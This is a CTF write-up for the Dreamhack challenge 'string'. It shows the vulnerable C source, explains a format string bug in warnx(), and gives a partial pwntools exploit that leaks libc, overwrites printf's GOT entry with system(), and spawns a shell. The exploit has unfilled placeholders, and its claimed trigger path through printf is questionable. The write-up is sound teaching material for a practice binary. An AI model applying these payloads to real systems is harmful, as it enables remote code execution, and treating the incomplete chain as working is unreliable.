---
title: "[Dreamhack] string - Format String Bug via warnx()"
date: 2024-01-19 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, format-string, got-overwrite, warnx, libc-leak, dreamhack]
author: datious
description: "Dreamhack writeup: string — format string vulnerability qua warnx() để leak libc và overwrite GOT với system()."
---

# [Write up for Dreamhack] Challenge: string
**Author: datious**

## Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <string.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    close(2);
    dup2(1, 2);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void input(char *buf) {
    printf("Input: ");
    read(0, buf, 255);
}

void print(char *buf) {
    warnx(buf);          // ← FORMAT STRING VULNERABILITY!
}

int main() {
    int idx;
    char buf[256];

    initialize();
    memset(buf, 0, sizeof(buf));

    while(1) {
        printf("1. Input\n");
        printf("2. Print\n");
        printf("3. Exit\n");
        printf("> ");
        scanf("%d", &idx);
        switch(idx) {
            case 1: input(buf);  break;
            case 2: print(buf);  break;
            default: break;
        }
    }
    return 0;
}
```

## Vulnerability — Format String via `warnx()`

`warnx()` is declared in `<err.h>` with prototype:

```c
void warnx(const char *fmt, ...);
```

It works like `fprintf(stderr, fmt, ...)`.

If `buf = "%x%x%x"`, then `warnx(buf)` → `fprintf(stderr, "%x%x%x")` → **format string vulnerability** → leak memory!

> **Note:** `close(2); dup2(1, 2);` redirects `stderr` to `stdout`, so `warnx()` output appears on our terminal.

## Security Layers

![Checksec](https://hackmd.io/_uploads/rykvU2-HGg.png)

## Strategy

1. **Leak libc address** using `%N$p` to read a libc pointer from the stack
2. **Calculate `system()` address** from libc base
3. **Overwrite GOT** of a frequently called function (e.g., `printf`) with `system()`
4. Trigger: input `/bin/sh` then call `print` → `warnx("/bin/sh")` → `system("/bin/sh")`

## Exploit

```python
from pwn import *

elf  = ELF('./string')
libc = ELF('./libc.so.6')
p    = process('./string')
# or: p = remote(...)

def input_buf(data):
    p.sendlineafter("> ", "1")
    p.sendafter("Input: ", data)

def print_buf():
    p.sendlineafter("> ", "2")
    return p.recvline()

# Step 1: Leak libc via format string
# Find the right offset with %N$p (test locally with GDB)
LIBC_OFFSET = 11   # adjust after testing

input_buf(f"%{LIBC_OFFSET}$p".encode())
leak = print_buf()
libc_leak = int(leak.split(b"0x")[1].split()[0], 16)
libc.address = libc_leak - libc.sym['__libc_start_main'] - ...
log.info(f"libc base: {hex(libc.address)}")

# Step 2: Overwrite printf@GOT with system()
system_addr = libc.sym['system']
printf_got  = elf.got['printf']

# Format string write payload (use pwntools fmtstr_payload)
payload = fmtstr_payload(offset, {printf_got: system_addr})
input_buf(payload)
print_buf()    # triggers the write

# Step 3: Trigger system("/bin/sh")
input_buf(b"/bin/sh\x00")
print_buf()    # → warnx("/bin/sh") → printf("/bin/sh") → system("/bin/sh")

p.interactive()
```

> **Tip:** `fmtstr_payload(offset, {addr: value})` from pwntools auto-generates a payload to write `value` to `addr` using format string `%n` writes.
